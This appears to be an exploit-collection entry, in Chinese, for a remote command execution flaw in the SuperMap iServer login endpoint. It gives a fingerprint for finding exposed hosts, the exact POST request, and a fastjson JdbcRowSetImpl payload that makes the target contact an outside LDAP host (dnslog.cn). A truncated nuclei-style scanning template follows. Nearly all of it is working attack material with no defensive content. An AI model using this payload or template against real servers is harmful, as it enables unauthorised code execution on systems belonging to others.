# SuperMap-iServerlogin远程命令执行漏洞

- **系统**：SuperMap　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/iserver/manager/"`
- **请求**：`POST /iserver/services/security/login.json?_t=1655187360048 HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
"rasdnd1": {
"@type": "java.lang.Class",
"val": "com.sun.rowset.JdbcRowSetImpl"
},
"randfd2": {
"@type": "com.sun.rowset.JdbcRowSetImpl",
"dataSourceName": "ldap://dnslog.cn",
"autoCommit": true
}
```
- **预期**：200　|　—

**其他**
- Yaml: | id: supermap-iserver-rce<br/><br/>info:<br/>  name: supermap-iserver-rce<br/>  author: HS<br/>  severity: high<br/><br/>http:<br/>  - raw:<br/>      - |<br/>        POST /iserver/services/security/login.json?_t=1655187360048 HTTP/1.1<br/>        Host: {{Hostname}}<br/>        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0<br/>        Connection: clos